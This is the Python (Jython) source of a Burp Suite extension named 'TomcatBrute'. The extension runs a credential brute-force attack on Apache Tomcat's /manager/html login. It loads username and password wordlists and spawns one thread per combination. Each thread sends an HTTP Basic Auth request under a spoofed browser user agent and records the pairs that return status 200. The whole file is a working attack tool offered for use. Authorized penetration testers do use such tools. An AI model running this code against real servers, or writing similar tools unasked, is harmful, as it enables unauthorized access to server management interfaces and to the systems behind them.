# encoding: utf-8
'''
Created on 2016-9-9

@author: lynn in WallbreakerTeam
'''

from burp import IBurpExtender, ITab

from javax import swing
from java.lang import Short

class BurpExtender(IBurpExtender, ITab):
    '''
    get url from proxy history window
    '''
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName('TomcatBrute')
        
        self._tomcatForceLogin()
        
        self._initTab(callbacks)
        
    # Override ITab Method 
    def getUiComponent(self):
        return self._toolkitTab
    
    def getTabCaption(self):
        return 'TomcatBrute'
    
# ###########################################################
# -------------------------------------------------
    def _initTab(self, callbacks):
        '''
        Initial Burp Tab View
        '''
        self._toolkitTab = swing.JTabbedPane()
        self._toolkitTab.addTab('Tomcat Fs Login', self._tomcatMainPanel)
        callbacks.customizeUiComponent(self._toolkitTab)
        callbacks.addSuiteTab(self)
    
# -------------------------------------------------
    def _tomcatForceLogin(self):
        '''
        Tomcat Force Login
        '''
        self._tomcatMainPanel = swing.JPanel()
        
        self._tomcatMainURLLabel = swing.JLabel('url : ')
        self._tomcatMainURLLabel.setHorizontalAlignment(swing.SwingConstants.CENTER);
        self._tomcatMainURLLabel.setBounds(30, 33, 54, 30);
        self._tomcatMainPanel.add(self._tomcatMainURLLabel);
        self._tomcatMainURL = swing.JTextField()
        self._tomcatMainURL.setBounds(94, 30, 275, 30);
        self._tomcatMainURL.setColumns(10);
        self._tomcatMainPanel.add(self._tomcatMainURL);
        
        self._tomcatMainUnameLabel = swing.JLabel('name : ')
        self._tomcatMainUnameLabel.setHorizontalAlignment(swing.SwingConstants.CENTER);
        self._tomcatMainUnameLabel.setBounds(30, 76, 54, 30);
        self._tomcatMainPanel.add(self._tomcatMainUnameLabel);
        self._tomcatMainUname = swing.JTextField()
        self._tomcatMainUname.setBounds(94, 73, 207, 30);
        self._tomcatMainUname.setColumns(10);
        self._tomcatMainUname.setEditable(False)
        self._tomcatMainPanel.add(self._tomcatMainUname);
        
        self._tomcatMainPwdLabel = swing.JLabel('pwd : ')
        self._tomcatMainPwdLabel.setHorizontalAlignment(swing.SwingConstants.CENTER);
        self._tomcatMainPwdLabel.setBounds(30, 120, 54, 30);
        self._tomcatMainPanel.add(self._tomcatMainPwdLabel);
        self._tomcatMainPwd = swing.JTextField()
        self._tomcatMainPwd.setBounds(94, 117, 207, 30);
        self._tomcatMainPwd.setColumns(10);
        self._tomcatMainPwd.setEditable(False)
        self._tomcatMainPanel.add(self._tomcatMainPwd);
        
        self._tomcatMainLoadUnames = swing.JButton('users', actionPerformed=self._tomcatLoadUsersFunc)
        self._tomcatMainLoadUnames.setBounds(311, 72, 58, 30);
        self._tomcatMainPanel.add(self._tomcatMainLoadUnames);
        
        self._tomcatMainLoadPwds = swing.JButton('pwds', actionPerformed=self._tomcatLoadPwdsDicts)
        self._tomcatMainLoadPwds.setBounds(311, 116, 58, 30);
        self._tomcatMainPanel.add(self._tomcatMainLoadPwds);
        
        self._tomcatMainFsCancel = swing.JButton('cancel', actionPerformed=self._tomcatFsCalcelFunc)
        self._tomcatMainFsCancel.setBounds(275, 167, 93, 23);
        self._tomcatMainPanel.add(self._tomcatMainFsCancel);
        
        self._tomcatMainFsStart = swing.JButton('start', actionPerformed=self._tomcatFsStartFunc)
        self._tomcatMainFsStart.setBounds(94, 167, 93, 23);
        self._tomcatMainPanel.add(self._tomcatMainFsStart);
        
        #self._tomcatMainProgressBar = swing.JProgressBar();
        #self._tomcatMainProgressBar.setBounds(11, 222, 358, 20);
        #self._tomcatMainPanel.add(self._tomcatMainProgressBar);
        self._tomcatMainAuthorLabel = swing.JLabel('Powdered by lynn')
        self._tomcatMainAuthorLabel.setHorizontalAlignment(swing.SwingConstants.CENTER);
        self._tomcatMainAuthorLabel.setBounds(11, 222, 358, 20);
        self._tomcatMainPanel.add(self._tomcatMainAuthorLabel);
        team = ('team:破壁者').decode("utf8") 
        self._tomcatMainTeamLabel = swing.JLabel(team)
        self._tomcatMainTeamLabel.setHorizontalAlignment(swing.SwingConstants.CENTER);
        self._tomcatMainTeamLabel.setBounds(11, 242, 358, 20);
        self._tomcatMainPanel.add(self._tomcatMainTeamLabel);
        
        self._tomcatMainPanel.setLayout(None)
        
    def _tomcatLoadUsersFunc(self, event):
        chooser = swing.JFileChooser()
        chooser.showOpenDialog(self._tomcatMainPanel)
        filePathName = ''
        try:
            if(chooser.getSelectedFile()) is not None:
                filePathName += (str(chooser.getSelectedFile()).replace('\\', '/'))
                self._tomcatMainUname.setText(filePathName.strip())
        except:
            print 'Open User File Error'
            
    def _tomcatLoadPwdsDicts(self, event):
        chooser = swing.JFileChooser()
        chooser.showOpenDialog(self._tomcatMainPanel)
        filePathName = ''
        try:
            if(chooser.getSelectedFile()) is not None:
                filePathName += (str(chooser.getSelectedFile()).replace('\\', '/'))
                self._tomcatMainPwd.setText(filePathName.strip())
        except:
            print 'Open Pwd File Error'
            
    def _tomcatFsCalcelFunc(self, event):
        print '_tomcatFsCalcelFunc'
        
    def _tomcatFsStartFunc(self, event):
        if (str(self._tomcatMainURL.getText()).strip()) != '':
            import urllib
            url = str(self._tomcatMainURL.getText().strip())
            if url.startswith('http://') or url.startswith('https://'):
                if not url.endswith('/'):
                    url += '/'
                proto, rest = urllib.splittype(url)
                host, rest = urllib.splithost(rest) 
                host2, port = urllib.splitport(host)
                host = host.split(':')[0]
                if port is None: 
                    port = 80
                                    
                usersFile = str(self._tomcatMainUname.getText())
                pwdsFile = str(self._tomcatMainPwd.getText())
                if usersFile != '' and pwdsFile != '':
                    bruter = Bruter(host, port, usersFile, pwdsFile)
                    print bruter.doLogin()
                    
                else:
                    print 'Please load dict files'
            else:
                print 'Check URL'
                    
                
                
# ##########################################################

import threading
import time
import httplib
import base64
from collections import deque

results = ''
class TomcatLogin(threading.Thread):
    def __init__(self, host, port, user, password):
        threading.Thread.__init__(self)
        self._host = str(host)
        self._port = str(port)
        self._user = str(user)
        self._password = str(password)
        self._userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
            
    def run(self):
        global results
        auth = base64.b64encode('%s:%s' % (self._user, self._password)).replace('\n', '')
        try:
            h = httplib.HTTPConnection(self._host, self._port)
            header = {
                'User-agent':self._userAgent,
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Authorization':'Basic %s' % auth
            }
            #print header
            h.request('GET', '/manager/html', headers=header)
            
            statuscode = h.getresponse().status
            print self._user + ':' + self._password + ';status:' + str(statuscode)
            if statuscode == 200:
                results += 'Username:' + self._user + " Password:" + self._password
            else:
                pass
        except Exception, msg:
            print msg
            
class Bruter():
    def __init__(self, host, port, userFile, pwdFile):
        self.host = host
        self.port = port
        self.userFile = userFile
        self.pwdFile = pwdFile
        
    def doLogin(self):
        global results
        USERNAMEs = [p.replace('\n', '') for p in open(self.userFile, 'r').readlines()]
        PASSWORDs = [p.replace('\n', '') for p in open(self.pwdFile, 'r').readlines()]
        
        # list 数组
        accounts = deque()
        for username in USERNAMEs:
            for password in PASSWORDs:
                accounts.append((username, password))
                
        for acc in range(len(accounts)):
            worker = TomcatLogin(self.host, self.port, accounts[acc][0], accounts[acc][1])
            worker.setDaemon(True)
            worker.start()
            time.sleep(0.1)
        
        #if results == '':
            #results = 'Brute Failed'
        return results
